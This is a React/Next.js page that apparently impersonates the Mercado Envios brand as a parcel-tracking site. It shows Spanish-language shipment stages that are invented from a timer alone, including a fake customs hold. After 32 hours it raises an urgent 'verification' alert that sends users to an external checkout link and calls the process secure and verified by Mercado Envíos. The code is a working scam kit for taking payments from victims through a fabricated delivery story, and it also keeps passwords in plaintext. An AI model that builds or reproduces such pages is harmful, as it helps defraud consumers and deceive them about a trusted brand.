'use client'

import { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { User, Mail, Lock, Eye, EyeOff, Copy, Check, AlertTriangle, Package, ExternalLink, MapPin, Truck, Clock, CheckCircle, RefreshCw, Plane, Globe, Shield, CreditCard, DollarSign } from 'lucide-react'
import { paymentGateway } from '@/lib/gateway'

export default function HomePage() {
  const [isLogin, setIsLogin] = useState(true)
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    password: ''
  })
  const [showPassword, setShowPassword] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState('')
  const [showAccountCode, setShowAccountCode] = useState(false)
  const [accountCode, setAccountCode] = useState('')
  const [codeCopied, setCodeCopied] = useState(false)
  const [currentTime, setCurrentTime] = useState(new Date())
  const [orderCreatedAt, setOrderCreatedAt] = useState<Date | null>(null)
  const [showAlert, setShowAlert] = useState(false)
  const [lastUpdate, setLastUpdate] = useState<Date | null>(null)
  const [paymentLoading, setPaymentLoading] = useState(false)
  const [isClient, setIsClient] = useState(false)
  const [currentUserEmail, setCurrentUserEmail] = useState<string | null>(null)
  const [currentUserCode, setCurrentUserCode] = useState<string | null>(null)
  const router = useRouter()

  // Função auxiliar para acessar localStorage de forma segura
  const safeLocalStorage = {
    getItem: (key: string): string | null => {
      if (typeof window === 'undefined') return null
      try {
        return localStorage.getItem(key)
      } catch {
        return null
      }
    },
    setItem: (key: string, value: string): void => {
      if (typeof window === 'undefined') return
      try {
        localStorage.setItem(key, value)
      } catch {
        // Silently fail
      }
    },
    removeItem: (key: string): void => {
      if (typeof window === 'undefined') return
      try {
        localStorage.removeItem(key)
      } catch {
        // Silently fail
      }
    },
    clear: (): void => {
      if (typeof window === 'undefined') return
      try {
        localStorage.clear()
      } catch {
        // Silently fail
      }
    }
  }

  // Verificar se está no cliente e carregar dados
  useEffect(() => {
    setIsClient(true)
    
    // Carregar dados do usuário
    const userEmail = safeLocalStorage.getItem('currentUserEmail')
    const userCode = safeLocalStorage.getItem('currentUserCode')
    
    setCurrentUserEmail(userEmail)
    setCurrentUserCode(userCode)
    
    if (userEmail) {
      // Carregar dados do pedido
      const orderTime = safeLocalStorage.getItem('orderCreatedAt')
      if (orderTime) {
        setOrderCreatedAt(new Date(orderTime))
      }
      
      const lastUpdateTime = safeLocalStorage.getItem('lastUpdate')
      if (lastUpdateTime) {
        setLastUpdate(new Date(lastUpdateTime))
      }
    }
  }, [])

  useEffect(() => {
    if (!isClient) return
    
    // Timer para atualizar o tempo atual a cada segundo
    const timer = setInterval(() => {
      setCurrentTime(new Date())
    }, 1000)

    return () => clearInterval(timer)
  }, [isClient])

  useEffect(() => {
    if (!isClient || !orderCreatedAt) return
    
    const now = new Date()
    const timeDiff = now.getTime() - orderCreatedAt.getTime()
    const hoursElapsed = timeDiff / (1000 * 60 * 60)

    // Verificar se passaram 32 horas
    if (hoursElapsed >= 32) {
      setShowAlert(true)
    }

    // Atualizar a cada 8 horas
    if (!lastUpdate || (now.getTime() - lastUpdate.getTime()) >= (8 * 60 * 60 * 1000)) {
      setLastUpdate(now)
      safeLocalStorage.setItem('lastUpdate', now.toISOString())
    }
  }, [currentTime, orderCreatedAt, lastUpdate, isClient])

  // Função para gerar código único da conta
  const generateAccountCode = () => {
    const prefix = 'ME'
    const timestamp = Date.now().toString().slice(-6)
    const random = Math.random().toString(36).substring(2, 6).toUpperCase()
    return `${prefix}${timestamp}${random}`
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({
      ...prev,
      [name]: value
    }))
    setError('')
  }

  const copyToClipboard = async () => {
    if (typeof navigator === 'undefined' || !navigator.clipboard) return
    
    try {
      await navigator.clipboard.writeText(accountCode)
      setCodeCopied(true)
      setTimeout(() => setCodeCopied(false), 2000)
    } catch (err) {
      console.error('Erro ao copiar código:', err)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setError('')

    // Simular delay de processamento
    await new Promise(resolve => setTimeout(resolve, 1000))

    try {
      if (isLogin) {
        // Lógica de login
        const users = JSON.parse(safeLocalStorage.getItem('users') || '[]')
        const user = users.find((u: any) => u.email === formData.email && u.password === formData.password)
        
        if (user) {
          safeLocalStorage.setItem('currentUserEmail', user.email)
          safeLocalStorage.setItem('currentUserName', user.name)
          safeLocalStorage.setItem('currentUserCode', user.accountCode)
          
          setCurrentUserEmail(user.email)
          setCurrentUserCode(user.accountCode)
          
          // Criar timestamp do pedido se não existir
          const existingOrderTime = safeLocalStorage.getItem('orderCreatedAt')
          if (!existingOrderTime) {
            const orderTime = new Date()
            safeLocalStorage.setItem('orderCreatedAt', orderTime.toISOString())
            setOrderCreatedAt(orderTime)
          } else {
            setOrderCreatedAt(new Date(existingOrderTime))
          }
          
          // Definir próxima atualização
          const existingLastUpdate = safeLocalStorage.getItem('lastUpdate')
          if (!existingLastUpdate) {
            const now = new Date()
            safeLocalStorage.setItem('lastUpdate', now.toISOString())
            setLastUpdate(now)
          }
          
        } else {
          setError('Email ou senha incorretos')
        }
      } else {
        // Lógica de cadastro
        if (!formData.name || !formData.email || !formData.password) {
          setError('Todos os campos são obrigatórios')
          setIsLoading(false)
          return
        }

        const users = JSON.parse(safeLocalStorage.getItem('users') || '[]')
        const userExists = users.some((u: any) => u.email === formData.email)
        
        if (userExists) {
          setError('Este email já está cadastrado')
        } else {
          // Gerar código único para a nova conta
          const newAccountCode = generateAccountCode()
          const now = new Date()
          
          const newUser = {
            name: formData.name,
            email: formData.email,
            password: formData.password,
            accountCode: newAccountCode,
            createdAt: now.toISOString()
          }
          
          users.push(newUser)
          safeLocalStorage.setItem('users', JSON.stringify(users))
          safeLocalStorage.setItem('currentUserEmail', newUser.email)
          safeLocalStorage.setItem('currentUserName', newUser.name)
          safeLocalStorage.setItem('currentUserCode', newUser.accountCode)
          safeLocalStorage.setItem('orderCreatedAt', now.toISOString())
          safeLocalStorage.setItem('lastUpdate', now.toISOString())
          
          setCurrentUserEmail(newUser.email)
          setCurrentUserCode(newUser.accountCode)
          setOrderCreatedAt(now)
          setLastUpdate(now)
          
          // Mostrar o código da conta antes de redirecionar
          setAccountCode(newAccountCode)
          setShowAccountCode(true)
        }
      }
    } catch (err) {
      setError('Ocorreu um erro. Tente novamente.')
    }
    
    setIsLoading(false)
  }

  const handleContinueToTracking = () => {
    setShowAccountCode(false)
  }

  const handleUnlockProduct = async () => {
    setPaymentLoading(true)
    
    try {
      // Usar o link de checkout fornecido pelo usuário
      if (typeof window !== 'undefined') {
        window.open('https://pay.mycheckoutt.com/0199e2ed-d4a3-73ca-bc07-3abb18366b55?ref=', '_blank')
      }
    } catch (error) {
      console.error('Erro ao processar pagamento:', error)
      // Fallback para o mesmo link em caso de erro
      if (typeof window !== 'undefined') {
        window.open('https://pay.mycheckoutt.com/0199e2ed-d4a3-73ca-bc07-3abb18366b55?ref=', '_blank')
      }
    } finally {
      setPaymentLoading(false)
    }
  }

  const getTimeElapsed = () => {
    if (!orderCreatedAt) return { hours: 0, minutes: 0 }
    
    const now = new Date()
    const timeDiff = now.getTime() - orderCreatedAt.getTime()
    const hours = Math.floor(timeDiff / (1000 * 60 * 60))
    const minutes = Math.floor((timeDiff % (1000 * 60 * 60)) / (1000 * 60))
    
    return { hours, minutes }
  }

  const getNextUpdateTime = () => {
    if (!lastUpdate) return null
    
    const nextUpdate = new Date(lastUpdate.getTime() + (8 * 60 * 60 * 1000))
    return nextUpdate
  }

  const getTrackingSteps = () => {
    const timeElapsed = getTimeElapsed()
    const allSteps = [
      {
        id: 1,
        title: 'Pedido Confirmado',
        description: 'Tu pedido ha sido recibido y confirmado',
        icon: CheckCircle,
        completed: true,
        time: '0h'
      },
      {
        id: 2,
        title: 'En Preparación',
        description: 'Preparando tu pedido para el envío',
        icon: Package,
        completed: timeElapsed.hours >= 0,
        active: timeElapsed.hours < 12,
        time: '0-12h'
      },
      {
        id: 3,
        title: 'Salió a Tránsito Internacional',
        description: 'Su producto salió a tránsito internacional',
        icon: Plane,
        completed: timeElapsed.hours >= 12,
        active: timeElapsed.hours >= 12 && timeElapsed.hours < 24,
        time: '12-24h'
      },
      {
        id: 4,
        title: 'En Tránsito Internacional',
        description: 'Su producto está en tránsito internacional',
        icon: Globe,
        completed: timeElapsed.hours >= 24,
        active: timeElapsed.hours >= 24 && timeElapsed.hours < 48,
        time: '24-48h'
      },
      {
        id: 5,
        title: 'Llegó al País de Destino',
        description: 'Su producto está yendo hasta usted',
        icon: MapPin,
        completed: timeElapsed.hours >= 48,
        active: timeElapsed.hours >= 48 && timeElapsed.hours < 62,
        time: '48-62h'
      },
      {
        id: 6,
        title: 'En Distribución Local',
        description: 'En el centro de distribución local',
        icon: Truck,
        completed: timeElapsed.hours >= 62,
        active: timeElapsed.hours >= 62 && timeElapsed.hours < 86,
        time: '62-86h'
      },
      {
        id: 7,
        title: 'Retenido en Aduana',
        description: 'Su producto fue retenido en el país de la aduana',
        icon: Shield,
        completed: timeElapsed.hours >= 86,
        active: timeElapsed.hours >= 86 && timeElapsed.hours < 120,
        time: '86-120h'
      },
      {
        id: 8,
        title: 'En Proceso de Liberación',
        description: 'Procesando documentación para liberación',
        icon: RefreshCw,
        completed: timeElapsed.hours >= 120,
        active: timeElapsed.hours >= 120 && timeElapsed.hours < 168,
        time: '120-168h'
      },
      {
        id: 9,
        title: 'Entregado',
        description: 'Pedido entregado exitosamente',
        icon: CheckCircle,
        completed: timeElapsed.hours >= 168,
        active: false,
        time: '168h+ (7 días)'
      }
    ]

    // FILTRAR APENAS AS ETAPAS QUE DEVEM SER VISÍVEIS
    // Mostrar apenas etapas completadas + a próxima etapa (se houver)
    const visibleSteps = []
    let foundActive = false
    
    for (let i = 0; i < allSteps.length; i++) {
      const step = allSteps[i]
      
      // Sempre mostrar etapas completadas
      if (step.completed) {
        visibleSteps.push(step)
      }
      // Mostrar a primeira etapa não completada (ativa)
      else if (!foundActive) {
        visibleSteps.push(step)
        foundActive = true
      }
      // Parar aqui - não mostrar etapas futuras
      else {
        break
      }
    }

    return visibleSteps
  }

  const getEstimatedDelivery = () => {
    if (!orderCreatedAt) return null
    
    const deliveryDate = new Date(orderCreatedAt.getTime() + (7 * 24 * 60 * 60 * 1000)) // 7 dias
    return deliveryDate
  }

  const getCurrentStatus = () => {
    const timeElapsed = getTimeElapsed()
    
    if (timeElapsed.hours < 12) return 'En Preparación'
    if (timeElapsed.hours < 24) return 'Salió a Tránsito Internacional'
    if (timeElapsed.hours < 48) return 'En Tránsito Internacional'
    if (timeElapsed.hours < 62) return 'Su producto está yendo hasta usted'
    if (timeElapsed.hours < 86) return 'En Distribución Local'
    if (timeElapsed.hours < 120) return 'Retenido en Aduana'
    if (timeElapsed.hours < 168) return 'En Proceso de Liberación'
    return 'Entregado'
  }

  const handleLogout = () => {
    safeLocalStorage.clear()
    setCurrentUserEmail(null)
    setCurrentUserCode(null)
    setOrderCreatedAt(null)
    setLastUpdate(null)
    if (typeof window !== 'undefined') {
      window.location.reload()
    }
  }

  // Não renderizar nada até confirmar que está no cliente
  if (!isClient) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"></div>
      </div>
    )
  }

  // Se usuário está logado, mostrar painel de rastreamento
  if (currentUserEmail && !showAccountCode) {
    const timeElapsed = getTimeElapsed()
    const nextUpdate = getNextUpdateTime()
    const isProductLocked = timeElapsed.hours >= 32
    const trackingSteps = getTrackingSteps()
    const estimatedDelivery = getEstimatedDelivery()
    const currentStatus = getCurrentStatus()

    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50">
        {/* Header Mobile-First */}
        <div className="sticky top-0 z-50 bg-white/95 backdrop-blur-sm border-b border-gray-200 shadow-sm">
          <div className="px-4 py-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <img 
                  src="https://k6hrqrxuu8obbfwn.public.blob.vercel-storage.com/temp/128eb626-2a45-4198-b5cb-8f099d790ef9.png" 
                  alt="Mercado Envios" 
                  className="h-8 w-auto sm:h-10"
                />
                <div>
                  <h1 className="text-lg sm:text-xl font-bold text-gray-900">Rastreo</h1>
                  <p className="text-xs sm:text-sm text-gray-600 font-mono">
                    {currentUserCode}
                  </p>
                </div>
              </div>
              <button
                onClick={handleLogout}
                className="bg-red-500 hover:bg-red-600 text-white px-3 py-2 sm:px-4 rounded-lg transition-colors text-sm font-medium"
              >
                Salir
              </button>
            </div>
          </div>
        </div>

        <div className="px-4 py-4 space-y-4 max-w-4xl mx-auto">
          {/* Status Card - Mobile Optimized */}
          <div className="bg-white rounded-2xl shadow-lg border border-gray-100 overflow-hidden">
            <div className="bg-gradient-to-r from-blue-500 to-blue-600 p-4 text-white">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-lg font-bold">Estado Actual</h2>
                  <p className="text-blue-100 text-sm">{currentStatus}</p>
                </div>
                <div className="text-right">
                  <p className="text-2xl font-bold">
                    {timeElapsed.hours}h {timeElapsed.minutes}m
                  </p>
                  <div className="flex items-center gap-1 text-blue-100 text-xs">
                    <Clock className="w-3 h-3" />
                    <span>Actualización automática</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Progress Bar */}
            <div className="p-4">
              <div className="flex justify-between items-center mb-2">
                <span className="text-sm font-medium text-gray-700">Progreso del envío</span>
                <span className="text-sm text-gray-500">
                  {Math.min(Math.floor((timeElapsed.hours / 168) * 100), 100)}%
                </span>
              </div>
              <div className="w-full bg-gray-200 rounded-full h-2">
                <div 
                  className="bg-gradient-to-r from-blue-500 to-green-500 h-2 rounded-full transition-all duration-500"
                  style={{ width: `${Math.min((timeElapsed.hours / 168) * 100, 100)}%` }}
                ></div>
              </div>
              
              {/* Estimated Delivery */}
              {estimatedDelivery && (
                <div className="mt-3 flex items-center justify-between text-sm">
                  <span className="text-gray-600">Entrega estimada:</span>
                  <span className="font-semibold text-green-600">
                    {estimatedDelivery.toLocaleDateString('es-ES', { 
                      weekday: 'short', 
                      day: 'numeric', 
                      month: 'short' 
                    })}
                  </span>
                </div>
              )}
            </div>
          </div>

          {/* Tracking Steps - Mobile Optimized - APENAS ETAPAS VISÍVEIS */}
          <div className="bg-white rounded-2xl shadow-lg border border-gray-100 p-4">
            <h3 className="text-lg font-bold text-gray-900 mb-4 flex items-center gap-2">
              <Package className="w-5 h-5 text-blue-600" />
              Seguimiento Detallado
            </h3>
            
            <div className="space-y-4">
              {trackingSteps.map((step, index) => {
                const IconComponent = step.icon
                return (
                  <div key={step.id} className="flex items-start gap-4 relative">
                    {/* Icon */}
                    <div className={`
                      flex-shrink-0 w-10 h-10 rounded-full flex items-center justify-center border-2 transition-all z-10 bg-white
                      ${step.completed 
                        ? 'bg-green-500 border-green-500 text-white' 
                        : step.active 
                          ? 'bg-blue-500 border-blue-500 text-white animate-pulse' 
                          : 'bg-gray-100 border-gray-300 text-gray-400'
                      }
                    `}>
                      <IconComponent className="w-5 h-5" />
                    </div>

                    {/* Connector Line */}
                    {index < trackingSteps.length - 1 && (
                      <div className={`
                        absolute left-5 top-10 w-0.5 h-12 transition-all
                        ${step.completed ? 'bg-green-300' : 'bg-gray-200'}
                      `}></div>
                    )}

                    {/* Content */}
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between mb-1">
                        <h4 className={`font-semibold ${
                          step.completed ? 'text-green-700' : 
                          step.active ? 'text-blue-700' : 'text-gray-500'
                        }`}>
                          {step.title}
                        </h4>
                        <span className="text-xs text-gray-500 font-mono bg-gray-100 px-2 py-1 rounded">
                          {step.time}
                        </span>
                      </div>
                      <p className={`text-sm ${
                        step.completed ? 'text-green-600' : 
                        step.active ? 'text-blue-600' : 'text-gray-500'
                      }`}>
                        {step.description}
                      </p>
                      
                      {step.active && (
                        <div className="mt-2 flex items-center gap-2 text-xs text-blue-600">
                          <RefreshCw className="w-3 h-3 animate-spin" />
                          <span>En proceso...</span>
                        </div>
                      )}
                    </div>
                  </div>
                )
              })}
            </div>
          </div>

          {/* Next Update Info */}
          {nextUpdate && !isProductLocked && (
            <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-2xl p-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center">
                  <Clock className="w-5 h-5 text-blue-600" />
                </div>
                <div>
                  <h4 className="font-semibold text-blue-900">Próxima Actualización</h4>
                  <p className="text-blue-700 text-sm">
                    {nextUpdate.toLocaleTimeString('es-ES', { 
                      hour: '2-digit', 
                      minute: '2-digit' 
                    })} - El sistema se actualiza automáticamente cada 8 horas
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Alert após 32 horas - Mobile Optimized com Gateway Integrado */}
          {isProductLocked && (
            <div className="bg-gradient-to-r from-red-50 to-orange-50 border-2 border-red-200 rounded-2xl shadow-lg overflow-hidden">
              <div className="bg-gradient-to-r from-red-500 to-orange-500 p-3">
                <div className="flex items-center gap-2 text-white">
                  <AlertTriangle className="w-6 h-6" />
                  <h3 className="text-lg font-bold">ATENCIÓN REQUERIDA</h3>
                </div>
              </div>
              
              <div className="p-4">
                <div className="mb-4">
                  <p className="text-red-800 font-medium mb-2">
                    🚨 Tu pedido requiere verificación adicional
                  </p>
                  <p className="text-red-700 text-sm leading-relaxed">
                    Han transcurrido más de 32 horas y necesitamos verificar algunos datos para completar la entrega de forma segura.
                  </p>
                </div>
                
                {/* Gateway Status */}
                <div className="mb-4 p-3 bg-white rounded-lg border border-orange-200">
                  <div className="flex items-center gap-2 mb-2">
                    <CreditCard className="w-4 h-4 text-orange-600" />
                    <span className="text-sm font-medium text-orange-800">
                      Sistema de Pagamento
                    </span>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className={`w-2 h-2 rounded-full ${
                      paymentGateway.isConfigured() ? 'bg-green-500' : 'bg-orange-500'
                    }`}></div>
                    <span className="text-xs text-gray-600">
                      {paymentGateway.isConfigured() 
                        ? 'Gateway configurado e ativo' 
                        : 'Usando sistema de fallback'
                      }
                    </span>
                  </div>
                </div>
                
                <button
                  onClick={handleUnlockProduct}
                  disabled={paymentLoading}
                  className="w-full bg-gradient-to-r from-red-500 to-orange-500 hover:from-red-600 hover:to-orange-600 text-white font-bold py-4 px-6 rounded-xl transition-all duration-200 flex items-center justify-center gap-3 shadow-lg hover:shadow-xl transform hover:scale-[1.02] active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {paymentLoading ? (
                    <>
                      <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                      Procesando...
                    </>
                  ) : (
                    <>
                      <DollarSign className="w-5 h-5" />
                      Verificar y Continuar Entrega
                    </>
                  )}
                </button>
                
                <div className="mt-3 flex items-center gap-2 text-xs text-red-600">
                  <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
                  <span>Proceso seguro y verificado por Mercado Envíos</span>
                </div>
              </div>
            </div>
          )}

          {/* Timeline de atualizações - Mobile Optimized */}
          <div className="bg-white rounded-2xl shadow-lg border border-gray-100 p-4">
            <h3 className="text-lg font-bold text-gray-900 mb-4 flex items-center gap-2">
              <Clock className="w-5 h-5 text-blue-600" />
              Historial de Actualizaciones
            </h3>
            
            <div className="space-y-3">
              {orderCreatedAt && Array.from({ length: Math.floor(timeElapsed.hours / 8) + 1 }, (_, i) => {
                const updateHour = i * 8
                const updateTime = new Date(orderCreatedAt.getTime() + (updateHour * 60 * 60 * 1000))
                
                const getUpdateMessage = (hour: number) => {
                  if (hour === 0) return '📦 Pedido creado y confirmado'
                  if (hour < 12) return '🔄 En preparación para envío'
                  if (hour < 24) return '✈️ Salió a tránsito internacional'
                  if (hour < 48) return '🌍 En tránsito internacional'
                  if (hour < 62) return '📍 Su producto está yendo hasta usted'
                  if (hour < 86) return '🚚 En distribución local'
                  if (hour < 120) return '🛡️ Retenido en aduana del país'
                  if (hour < 168) return '⚠️ En proceso de liberación'
                  return '✅ Entregado exitosamente'
                }
                
                return (
                  <div key={i} className="flex items-center gap-3 p-3 bg-gray-50 rounded-xl border border-gray-100">
                    <div className="w-3 h-3 bg-blue-500 rounded-full flex-shrink-0"></div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between mb-1">
                        <p className="font-medium text-gray-900 text-sm">
                          Actualización #{i + 1}
                        </p>
                        <span className="text-xs text-gray-500 font-mono">
                          {updateTime.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' })}
                        </span>
                      </div>
                      <p className="text-xs text-gray-600">
                        {getUpdateMessage(updateHour)}
                      </p>
                    </div>
                  </div>
                )
              })}
            </div>
          </div>

          {/* Footer Info */}
          <div className="text-center py-4">
            <p className="text-xs text-gray-500">
              Sistema de rastreo automático • Actualizado cada 8 horas • Entrega en hasta 7 días
            </p>
          </div>
        </div>
      </div>
    )
  }

  // Modal de código da conta - Mobile Optimized
  if (showAccountCode) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-blue-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-xl p-6 w-full max-w-sm">
          {/* Logo */}
          <div className="text-center mb-6">
            <img 
              src="https://k6hrqrxuu8obbfwn.public.blob.vercel-storage.com/temp/128eb626-2a45-4198-b5cb-8f099d790ef9.png" 
              alt="Mercado Envios" 
              className="h-10 w-auto mx-auto mb-3"
            />
            <h1 className="text-xl font-bold text-green-600 mb-2">
              ¡Cuenta Creada!
            </h1>
            <p className="text-gray-600 text-sm">
              Tu código de rastreo ha sido generado
            </p>
          </div>

          {/* Código da conta */}
          <div className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-200 rounded-xl p-4 mb-4">
            <div className="text-center">
              <p className="text-sm font-medium text-gray-700 mb-2">
                Tu Código de Rastreo:
              </p>
              <div className="bg-white rounded-lg p-3 border border-green-300 mb-3">
                <p className="text-xl font-bold text-green-600 tracking-wider font-mono">
                  {accountCode}
                </p>
              </div>
              <button
                onClick={copyToClipboard}
                className="flex items-center justify-center gap-2 w-full bg-green-500 hover:bg-green-600 text-white font-medium py-3 px-4 rounded-lg transition-all duration-200 active:scale-95"
              >
                {codeCopied ? (
                  <>
                    <Check className="w-4 h-4" />
                    ¡Copiado!
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4" />
                    Copiar Código
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Informações importantes */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-4">
            <h3 className="font-semibold text-blue-800 mb-2 text-sm">
              📱 Información Importante:
            </h3>
            <ul className="text-xs text-blue-700 space-y-1">
              <li>• Guarda este código en un lugar seguro</li>
              <li>• Úsalo para rastrear todos tus pedidos</li>
              <li>• El sistema se actualiza automáticamente</li>
              <li>• Entrega estimada: hasta 7 días</li>
              <li>• Optimizado para dispositivos móviles</li>
            </ul>
          </div>

          {/* Botão continuar */}
          <button
            onClick={handleContinueToTracking}
            className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 px-4 rounded-lg transition-all duration-200 active:scale-95"
          >
            Ir al Panel de Rastreo
          </button>
        </div>
      </div>
    )
  }

  // Login/Register Form - Mobile Optimized
  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-blue-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-xl p-6 w-full max-w-sm">
        {/* Logo */}
        <div className="text-center mb-6">
          <img 
            src="https://k6hrqrxuu8obbfwn.public.blob.vercel-storage.com/temp/128eb626-2a45-4198-b5cb-8f099d790ef9.png" 
            alt="Mercado Envios" 
            className="h-10 w-auto mx-auto mb-3"
          />
          <h1 className="text-xl font-bold text-gray-900 mb-2">
            {isLogin ? 'Iniciar Sesión' : 'Crear Cuenta'}
          </h1>
          <p className="text-gray-600 text-sm">
            {isLogin ? 'Accede para rastrear tus pedidos' : 'Regístrate para comenzar'}
          </p>
        </div>

        {/* Error Message */}
        {error && (
          <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg mb-4 text-sm">
            {error}
          </div>
        )}

        {/* Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          {/* Name Field (only for register) */}
          {!isLogin && (
            <div>
              <label htmlFor="name" className="block text-sm font-medium text-gray-700 mb-2">
                Nombre Completo
              </label>
              <div className="relative">
                <User className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                <input
                  id="name"
                  name="name"
                  type="text"
                  value={formData.name}
                  onChange={handleInputChange}
                  className="w-full pl-12 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all text-base"
                  placeholder="Tu nombre completo"
                  required={!isLogin}
                />
              </div>
            </div>
          )}

          {/* Email Field */}
          <div>
            <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-2">
              E-mail
            </label>
            <div className="relative">
              <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
              <input
                id="email"
                name="email"
                type="email"
                value={formData.email}
                onChange={handleInputChange}
                className="w-full pl-12 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all text-base"
                placeholder="tu@email.com"
                required
              />
            </div>
          </div>

          {/* Password Field */}
          <div>
            <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
              Contraseña
            </label>
            <div className="relative">
              <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
              <input
                id="password"
                name="password"
                type={showPassword ? 'text' : 'password'}
                value={formData.password}
                onChange={handleInputChange}
                className="w-full pl-12 pr-12 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all text-base"
                placeholder="Tu contraseña"
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 p-1"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isLoading}
            className="w-full bg-green-500 hover:bg-green-600 text-white font-semibold py-3 px-4 rounded-lg transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center active:scale-95"
          >
            {isLoading ? (
              <>
                <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                Procesando...
              </>
            ) : (
              isLogin ? 'Iniciar Sesión' : 'Crear Cuenta'
            )}
          </button>
        </form>

        {/* Toggle Login/Register */}
        <div className="mt-4 text-center">
          <p className="text-gray-600 text-sm">
            {isLogin ? '¿No tienes cuenta?' : '¿Ya tienes cuenta?'}
            <button
              onClick={() => {
                setIsLogin(!isLogin)
                setFormData({ name: '', email: '', password: '' })
                setError('')
              }}
              className="ml-2 text-blue-600 hover:text-blue-800 font-semibold transition-colors"
            >
              {isLogin ? 'Crear cuenta' : 'Iniciar sesión'}
            </button>
          </p>
        </div>

        {/* Demo Access */}
        <div className="mt-4 pt-4 border-t border-gray-200">
          <p className="text-center text-xs text-gray-500 mb-2">
            Acceso de demostración:
          </p>
          <button
            onClick={() => {
              setFormData({
                name: 'Usuario Demo',
                email: 'demo@mercadoenvios.com',
                password: 'demo123'
              })
              setIsLogin(true)
            }}
            className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-medium py-2 px-4 rounded-lg transition-all duration-200 text-sm active:scale-95"
          >
            Usar cuenta demo
          </button>
        </div>
      </div>
    </div>
  )
}